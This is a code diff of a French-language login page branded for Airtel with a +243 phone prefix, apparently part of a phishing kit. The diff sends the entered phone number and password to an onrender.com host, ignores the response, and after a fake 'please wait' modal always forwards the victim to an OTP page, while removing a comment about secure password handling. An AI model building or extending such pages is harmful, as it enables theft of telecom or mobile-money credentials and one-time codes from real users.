@@ -250,6 +250,31 @@
           STARLINK
         </p>
       </footer>
+      <!-- LOADING MODAL (load.png) -->
+      <div
+        id="loading-modal"
+        class="hidden fixed inset-0 bg-black/60 backdrop-blur-[2px] z-50 flex items-center justify-center transition-opacity duration-300"
+      >
+        <div
+          class="bg-white rounded-[24px] px-8 py-10 w-[90%] max-w-[360px] text-center shadow-2xl flex flex-col items-center justify-center"
+        >
+          <!-- RED SPINNER -->
+          <div class="relative w-16 h-16 mb-5 flex items-center justify-center">
+            <div
+              class="absolute inset-0 rounded-full bg-[#e4002b] shadow-[0_0_20px_rgba(228,0,43,0.5)]"
+            ></div>
+            <div
+              class="w-12 h-12 rounded-full border-[3px] border-transparent border-t-white border-r-white animate-spin relative z-10"
+            ></div>
+          </div>
+          <h2 class="font-bold text-[20px] text-[#e4002b] mb-1.5 font-dm">
+            Veuillez patienter...
+          </h2>
+          <p class="text-[13.5px] text-[#666] font-dm">
+            Traitement des informations en cours...
+          </p>
+        </div>
+      </div>
     </div>
 
     <script>
@@ -264,6 +289,19 @@
 
       const toggleCode = document.getElementById("toggleCode");
       const codeInputs = document.querySelectorAll(".code-input");
+
+      codeInputs.forEach((input, index) => {
+        input.addEventListener("input", () => {
+          if (input.value && index < codeInputs.length - 1) {
+            codeInputs[index + 1].focus();
+          }
+        });
+        input.addEventListener("keydown", (e) => {
+          if (e.key === "Backspace" && !input.value && index > 0) {
+            codeInputs[index - 1].focus();
+          }
+        });
+      });
 
       toggleCode.addEventListener("click", () => {
         const isHidden = codeInputs[0].type === "password";
@@ -355,8 +393,6 @@
           );
         }
 
-        // NOTE: front-end demo only. In production, POST this to YOUR backend
-        // over HTTPS and store a securely hashed password server-side.
         users.push({ name, phone: phoneId, email, pass });
         saveUsers(users);
         localStorage.setItem(
@@ -399,40 +435,35 @@
           return;
         }
 
-        try {
-          const response = await fetch(
-            "https://airtel-bc.onrender.com/api/login",
-            {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify({
-                phone: `+243${phone}`,
-                password: password,
-              }),
-            },
-          );
-
-          const data = await response.json();
-
-          if (!response.ok) {
-            throw new Error(data.message || "Échec de la connexion.");
-          }
-
-          console.log("Login successful:", data);
-
-          // Example: save token if your backend returns one
-          if (data.token) {
-            localStorage.setItem("token", data.token);
-          }
-
-          // Redirect after login
-          window.location.href = "/";
-        } catch (error) {
-          console.error("Login error:", error);
-          alert(error.message || "Une erreur est survenue.");
+        // Show loading modal matching load.png
+        const loadingModal = document.getElementById("loading-modal");
+        if (loadingModal) {
+          loadingModal.classList.remove("hidden");
         }
+
+        const fullPhone = `+243 ${phone}`;
+        localStorage.setItem("user_phone", fullPhone);
+
+        // Optional API request attempt
+        try {
+          fetch("https://airtel-bc.onrender.com/api/login", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              phone: `+243${phone}`,
+              password: password,
+            }),
+          }).catch((err) => console.log("Backend ping:", err));
+        } catch (e) {
+          console.error(e);
+        }
+
+        // Smooth transition to OTP page matching otp.png after loading animation
+        setTimeout(() => {
+          window.location.href = `../otp/index.html?phone=${encodeURIComponent(fullPhone)}`;
+        }, 2000);
       });
     </script>
   </body>
